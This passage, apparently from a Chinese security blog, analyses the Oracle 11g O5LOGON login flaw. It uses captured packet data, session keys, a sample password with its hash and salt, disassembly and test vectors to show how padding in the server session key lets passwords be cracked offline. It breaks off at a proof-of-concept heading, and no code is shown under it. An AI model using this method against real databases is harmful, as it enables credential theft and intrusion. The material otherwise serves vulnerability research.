class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0000   03 73 03 d0 1a 05 0a 09 00 00 00 21 01 00 00 44  .s.........!...D</span><br><span class="line">0010   46 bf bf 0d 00 00 00 ec 42 bf bf d8 53 bf bf 03  F.......B...S...</span><br><span class="line">0020   73 79 73 24 00 00 00 0c 41 55 54 48 5f 53 45 53  sys$....AUTH_SES</span><br><span class="line">0030   53 4b 45 59 20 01 00 00 fe 40 46 41 36 44 43 44  SKEY ....@FA6DCD</span><br><span class="line">0040   30 46 33 38 39 45 39 32 44 31 38 46 38 31 38 38  0F389E92D18F8188</span><br><span class="line">0050   45 43 36 39 33 31 33 42 35 32 34 46 34 32 31 31  EC69313B524F4211</span><br><span class="line">0060   38 34 46 41 45 36 37 39 36 31 33 41 37 32 46 43  84FAE679613A72FC</span><br><span class="line">0070   38 44 46 44 30 41 34 43 37 42 20 42 39 33 41 36  8DFD0A4C7B B93A6</span><br><span class="line">0080   41 43 42 38 45 30 35 42 38 32 35 38 41 30 32 30  ACB8E05B8258A020</span><br><span class="line">0090   44 32 39 35 34 45 43 31 42 36 33 00 01 00 00 00  D2954EC1B63.....</span><br><span class="line">00a0   27 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f  &#x27;....AUTH_PASSWO</span><br><span class="line">00b0   52 44 c0 00 00 00 40 32 43 35 46 39 35 37 41 36  RD....@2C5F957A6</span><br><span class="line">00c0   35 33 32 41 44 39 31 44 39 31 36 46 34 45 35 46  532AD91D916F4E5F</span><br><span class="line">00d0   41 37 44 32 46 44 41 30 45 36 43 44 46 46 42 41  A7D2FDA0E6CDFFBA</span><br><span class="line">00e0   41 45 44 38 38 33 43 41 46 34 46 32 30 30 43 38  AED883CAF4F200C8</span><br><span class="line">00f0   39 38 33 41 45 33 44 00 00 00 00 18 00 00 00 08  983AE3D.........</span><br><span class="line">0100   41 55 54 48 5f 52 54 54 0f 00 00 00 05 36 36 37  AUTH_RTT.....667</span><br><span class="line">0110   30 38 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f  08....&#x27;....AUTH_</span><br><span class="line">0120   43 4c 4e 54 5f 4d 45 4d 0c 00 00 00 04 34 30 39  CLNT_MEM.....409</span><br><span class="line">0130   36 00 00 00 00 27 00 00 00 0d 41 55 54 48 5f 54  6....&#x27;....AUTH_T</span><br><span class="line">0140   45 52 4d 49 4e 41 4c 12 00 00 00 06 70 74 73 2f  ERMINAL.....pts/</span><br><span class="line">0150   31 38 00 00 00 00 2d 00 00 00 0f 41 55 54 48 5f  18....-....AUTH_</span><br><span class="line">0160   50 52 4f 47 52 41 4d 5f 4e 4d 51 00 00 00 1b 73  PROGRAM_NMQ....s</span><br><span class="line">0170   71 6c 70 6c 75 73 40 68 65 6e 69 63 65 73 20 28  qlplus@henices (</span><br><span class="line">0180   54 4e 53 20 56 31 2d 56 33 29 00 00 00 00 24 00  TNS V1-V3)....$.</span><br><span class="line">0190   00 00 0c 41 55 54 48 5f 4d 41 43 48 49 4e 45 15  ...AUTH_MACHINE.</span><br><span class="line">01a0   00 00 00 07 68 65 6e 69 63 65 73 00 00 00 00 18  ....henices.....</span><br><span class="line">01b0   00 00 00 08 41 55 54 48 5f 50 49 44 0c 00 00 00  ....AUTH_PID....</span><br><span class="line">01c0   04 36 32 32 38 00 00 00 00 18 00 00 00 08 41 55  .6228.........AU</span><br><span class="line">01d0   54 48 5f 53 49 44 15 00 00 00 07 68 65 6e 69 63  TH_SID.....henic</span><br><span class="line">01e0   65 73 00 00 00 00 18 00 00 00 08 41 55 54 48 5f  es.........AUTH_</span><br><span class="line">01f0   41 43 4c 0c 00 00 00 04 34 34 30 30 00 00 00 00  ACL.....4400....</span><br><span class="line">0200   36 00 00 00 12 41 55 54 48 5f 41 4c 54 45 52 5f  6....AUTH_ALTER_</span><br><span class="line">0210   53 45 53 53 49 4f 4e 6f 00 00 00 25 41 4c 54 45  SESSIONo...%ALTE</span><br><span class="line">0220   52 20 53 45 53 53 49 4f 4e 20 53 45 54 20 54 49  R SESSION SET TI</span><br><span class="line">0230   4d 45 5f 5a 4f 4e 45 3d 27 2b 30 38 3a 30 30 27  ME_ZONE=&#x27;+08:00&#x27;</span><br><span class="line">0240   00 01 00 00 00 45 00 00 00 17 41 55 54 48 5f 4c  .....E....AUTH_L</span><br><span class="line">0250   4f 47 49 43 41 4c 5f 53 45 53 53 49 4f 4e 5f 49  OGICAL_SESSION_I</span><br><span class="line">0260   44 60 00 00 00 20 43 41 41 38 39 33 41 43 30 41  D`... CAA893AC0A</span><br><span class="line">0270   34 33 30 46 41 30 45 30 34 30 30 30 37 46 30 31  430FA0E040007F01</span><br><span class="line">0280   30 31 31 38 35 34 00 00 00 00 30 00 00 00 10 41  011854....0....A</span><br><span class="line">0290   55 54 48 5f 46 41 49 4c 4f 56 45 52 5f 49 44 00  UTH_FAILOVER_ID.</span><br><span class="line">02a0   00 00 00 00 00 00 00                             .......</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AUTH_SESSKEY_SRV: 52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="line">AUTH_SESSKEY_CLI: FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="line">AUTH_PASSWORD   : 2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="line">AUTH_VFR_DATA   : 43E0BE20B32B0BB76E57</span><br></pre></td></tr></table></figure>
-
-<h2 id="Oracle-O5LOGON-协议介绍"><a href="#Oracle-O5LOGON-协议介绍" class="headerlink" title="Oracle O5LOGON 协议介绍"></a>Oracle O5LOGON 协议介绍</h2><p>Oracle 11g password hash 算法为, 用户名 sys, 密码 nsfocus</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.sha1(<span class="string">&#x27;nsfocus&#x27;</span> + <span class="string">&#x27;\x43\xE0\xBE\x20\xB3\x2B\x0B\xB7\x6E\x57&#x27;</span>).hexdigest()</span><br><span class="line"><span class="string">&#x27;c3d98762d258d4bd92c572065ddea9af38123f88&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以在Oracle数据中查询:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span><span class="operator">&gt;</span> <span class="keyword">select</span> name, password, spare4 <span class="keyword">from</span> sys.user$ <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;SYS&#x27;</span>;</span><br><span class="line"></span><br><span class="line">NAME                   PASSWORD</span><br><span class="line"><span class="comment">------------------------------ ------------------------------</span></span><br><span class="line">SPARE4</span><br><span class="line"><span class="comment">--------------------------------------------------------------------------------</span></span><br><span class="line">SYS                <span class="number">0</span>F2417000362F55F</span><br><span class="line">S:C3D98762D258D4BD92C572065DDEA9AF38123F8843E0BE20B32B0BB76E57</span><br><span class="line"></span><br><span class="line">password hash： C3D98762D258D4BD92C572065DDEA9AF38123F88</span><br><span class="line">salt         ： <span class="number">43E0</span>BE20B32B0BB76E57</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>client 发送用户名给server<br>2  server 判断是否是可用的用户名，如果用户名可用，进入下一步。</li>
-<li>Server 加密AUTH_SESSKEY,  取出 salt</li>
-</ol>
-<p>使用AES192 CBC 加密AUTH_SESSKEY, key为oralce数据库中的20字节的password hash和4个<br>零(192bit)。</p>
-<ol start="4">
-<li><p>Server 将加密的AUTH_SESSKEY和AUTH_VFR_DATA 发送给Client<br>AUTH_VFR_DATA 为salt</p>
-</li>
-<li><p>Client计算password hash (通过用户输入的密码), 使用Client计算的password hash<br>(加上4个零)为key 使用AES192 CBC算法加密Client AUTH_SESSKEY</p>
-</li>
-<li><p>Client 计算 Combine_SessKey<br>将解密的Server AUTH_SESSKEY 和 Client AUTH_SESSKEY的第17个字节开始的24个字节做异<br>或，将异或结果的前16字节做MD5, 后8字节做MD5, 得到Combine_SessKey</p>
-</li>
-<li><p>Client 使用 Combine_SessKey 加密用户输入的密码明文，得到 AUTH_PASSWORD<br>使用算法为AES192 CBC</p>
-</li>
-<li><p>Client 将加密的Client AUTH_SESSKEY和加密的AUTH_PASSWORD 发送给 Server</p>
-</li>
-<li><p>Server 使用数据库中的 password hash 解密 Client AUTH_SESSKEY</p>
-</li>
-<li><p>Server 尝试解密AUTH_PASSWORD 解密成功则认证通过</p>
-</li>
-</ol>
-<p>参看:<br><a target="_blank" rel="noopener" href="http://www.oxid.it/downloads/oracle_tns_aes192_check.txt">http://www.oxid.it/downloads/oracle_tns_aes192_check.txt</a></p>
-<p>这个漏洞是生成server sesskey 时，在末尾添加了8个0x08, 因为salt已知（由服务器返回<br>），因此我们只需尝试计算SHA-1的password hash，然后利用这个password hash 去解密<br>server sesskey， 只要末尾是8个0x08 则说明这是正确的server sesskey，此时使用的密<br>码为正确的密码，原因是</p>
-<p>AES 192 加密块长度为128 bit (16 byte), 分组加密如果明文内容不是块长度的整数倍时<br>需要填充。填充部分的内容为差的字节数，比如11字节的明文，需要在末尾填充5个0x5</p>
-<p>从汇编代码里分析server session key 的生成过程，分析的程序为 Oracle.exe 11.2.0.1.0<br>oracle.exe调用 oran11.ztvo5ke 加密session key</p>
-<p>oran11.ztvo5ke -&gt; oracrypt11.ztceenc  -&gt; orancrypt11.ztcen</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e_key</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">2</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">100</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sess_key</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">40</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pwd_hash</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> unknown1;</span><br><span class="line">    <span class="type">uint32_t</span> hash_len;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hash[<span class="number">20</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ztvo5ke ( e_key*, sess_key*, pwd_hash*, <span class="type">int</span>);</span><br></pre></td></tr></table></figure>
-<p>sess_key.type &#x3D;&#x3D; 0x1492 ( AES 192 )</p>
-<p>plaintext    24  + 16 &#x3D; 40 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:101BC481                 push    eax        ; unknown structure</span><br><span class="line">.text:101BC482                 push    edx        ; encrypted session key</span><br><span class="line">.text:101BC483                 push    28h        ; length</span><br><span class="line">.text:101BC485                 push    ecx        ; plaintext session key</span><br><span class="line">.text:101BC486                 push    0</span><br><span class="line">.text:101BC488                 push    ebx        ; 0x18</span><br><span class="line">.text:101BC489                 push    87004001h</span><br><span class="line">.text:101BC48E                 call    ztceenc    ; AES 192</span><br><span class="line">.text:101BC493                 add     esp, 1Ch</span><br><span class="line">.text:101BC496                 mov     ebx, eax</span><br><span class="line">.text:101BC498                 test    ebx, ebx</span><br><span class="line">.text:101BC49A                 jnz     short loc_101BC4B8</span><br><span class="line">.text:101BC49C                 lea     edx, [ebp+var_A4]</span><br><span class="line">.text:101BC4A2                 lea     eax, [edi+2]</span><br><span class="line">.text:101BC4A5                 push    eax       ; e_key+2</span><br><span class="line">.text:101BC4A6                 push    [ebp+var_C8]</span><br><span class="line">.text:101BC4AC                 push    edx       ; encryted session key</span><br><span class="line">.text:101BC4AD                 call    ztucbtx</span><br></pre></td></tr></table></figure>
-
-<p>ztceenc  运行前后的情况</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0DC3A4E4                                      40 00 00 00                       </span><br><span class="line">0DC3A4F4  00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00..                        </span><br><span class="line">0DC3A504  0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00..                        </span><br><span class="line">0DC3A514  02 00 00 00 00 00 00 00 14 00 00 00 14 00 00 00..                     </span><br><span class="line">0DC3A524  44 94 3E 10 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A534  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A544  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A554  7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9..                        </span><br><span class="line">0DC3A564  EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37..                        </span><br><span class="line">0DC3A574  8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D..                        </span><br><span class="line">0DC3A584  C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B..                        </span><br><span class="line">0DC3A594  0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A5A4  18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C..                     </span><br><span class="line">0DC3A5B4  94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D..                        </span><br><span class="line">0DC3A5C4  F8 49 FE 0C 10 FB EC 0D..........................                     </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line">eax = 0DC3A4F0                                                                  </span><br><span class="line">edx = 0DC3A514                                                                  </span><br><span class="line">ecx = 0DC3A554                                                                  </span><br><span class="line">ebx = 0DC3A5A4                                                                  </span><br><span class="line">                                                                                </span><br><span class="line">                                                                                </span><br><span class="line">0DC3A4E4                                      30 00 00 00..                     </span><br><span class="line">0DC3A4F4  00 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00..                        </span><br><span class="line">0DC3A504  0C 4A FE 0C 02 00 00 00 FF FF FF FF 13 00 00 00..                        </span><br><span class="line">0DC3A514  61 15 91 7F D6 AE B9 29 00 07 A4 02 A6 B1 2B AA..                        </span><br><span class="line">0DC3A524  BD 3B AA 0C 13 C0 E5 18 8E FE BA AC F5 4C 01 BE.                      </span><br><span class="line">0DC3A534  96 8F 59 0D B9 9E 2C F6 98 74 1F EF 22 CE 17 47..                        </span><br><span class="line">0DC3A544  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A554  7A EF 5B 9E 89 D3 9F 07 62 A8 83 BB C6 4D 9F D9..                        </span><br><span class="line">0DC3A564  EA 7B 90 1C 49 9B 73 36 BE 60 AF F6 69 A4 ED 37..                        </span><br><span class="line">0DC3A574  8D 1D B3 B7 60 30 C7 56 00 00 00 00 8C A5 C3 0D..                        </span><br><span class="line">0DC3A584  C8 B3 13 21 77 BF F6 84 28 3A D6 54 9F 65 96 0B..                        </span><br><span class="line">0DC3A594  0E 0A E4 60 00 00 00 00 00 00 00 00 00 00 00 00..                        </span><br><span class="line">0DC3A5A4  18 00 00 00 84 A5 C3 0D E0 3E FE 0C A8 46 A7 0C..                     </span><br><span class="line">0DC3A5B4  94 77 FE 0C 0C C6 C3 0D 4A EA 50 01 F4 C4 C3 0D..                        </span><br><span class="line">0DC3A5C4  F8 49 FE 0C 10 FB EC 0D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0DC3A4F0   30 00 00 00       offset</span><br><span class="line">0DC3A514   61 15 91 7F  ...  encrypted session key (0x30 byte)</span><br><span class="line">0DC3A554   7A EF 5B 9E  ...  plaintext session key (0x28 byte)</span><br><span class="line">0DC3A584   8 B3 13 21   ...  password  hash        (0x18 byte)</span><br></pre></td></tr></table></figure>
-
-<p>AES 192 加密40字节的明文，需要填充 8个 0x08</p>
-<p>11.1</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PASSWORD:            nsfocus</span><br><span class="line">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="line">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="line">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="line">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span><br><span class="line"></span><br><span class="line">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span><br></pre></td></tr></table></figure>
-
-<p>11.2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PASSWORD    :        nsfocus</span><br><span class="line">AUTH_SESSKEY:        52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="line">AUTH_SESSKEY_C       FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="line">AUTH_PASSWORD        2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="line">AUTH_VFR_DATA        43E0BE20B32B0BB76E57</span><br><span class="line"></span><br><span class="line">PASSWORD HASH:       C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aes key</span><br><span class="line">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span><br><span class="line">0010 5c 85 94 f7 00 00 00 00</span><br><span class="line"></span><br><span class="line">decrypted_server_sesskey</span><br><span class="line">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span><br><span class="line">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span><br><span class="line">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span><br><span class="line"></span><br><span class="line">encrypted_server_sesskey</span><br><span class="line">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="line">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="line">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="line"></span><br><span class="line">AUTH_SESSKEY</span><br><span class="line">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="line">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="line">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aes key</span><br><span class="line">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span><br><span class="line">0010 38 12 3f 88 00 00 00 00</span><br><span class="line"></span><br><span class="line">decrypted_server_sesskey</span><br><span class="line">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span><br><span class="line">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span><br><span class="line">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span><br><span class="line"></span><br><span class="line">encrypted_server_sesskey</span><br><span class="line">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="line">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="line">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="line"></span><br><span class="line">AUTH_SESSKEY</span><br><span class="line">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="line">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="line">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="exploit-POC"><a href="#exploit-POC" class="headerlink" title="exploit (POC)"></a>exploit (POC)</h2><p>o5logoncrack.c</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span 